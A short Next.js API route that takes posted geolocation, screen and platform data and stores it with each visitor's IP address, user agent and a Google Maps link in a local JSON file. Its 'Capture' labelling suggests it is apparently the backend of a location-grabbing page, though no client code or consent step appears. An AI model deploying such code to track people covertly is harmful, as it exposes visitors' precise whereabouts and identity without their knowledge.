import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

const LOG_FILE = path.join(process.cwd(), 'data', 'locations.json');

// Ensure data directory exists
if (!fs.existsSync(path.join(process.cwd(), 'data'))) {
  fs.mkdirSync(path.join(process.cwd(), 'data'));
}

export async function POST(req) {
  try {
    const data = await req.json();
    const { lat, lon, accuracy, platform, screen } = data;
    
    const ip = req.headers.get('x-forwarded-for') || req.ip || 'Unknown';
    const userAgent = req.headers.get('user-agent') || 'Unknown';
    
    const logEntry = {
      id: Date.now(),
      timestamp: new Date().toISOString(),
      ip,
      userAgent,
      lat,
      lon,
      accuracy,
      platform,
      screen,
      googleMapsUrl: `https://www.google.com/maps?q=${lat},${lon}`
    };

    // Read existing logs
    let logs = [];
    if (fs.existsSync(LOG_FILE)) {
      const fileContent = fs.readFileSync(LOG_FILE, 'utf8');
      logs = JSON.parse(fileContent);
    }

    // Add new entry
    logs.push(logEntry);

    // Save logs
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Capture Error:', error);
    return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
  }
}
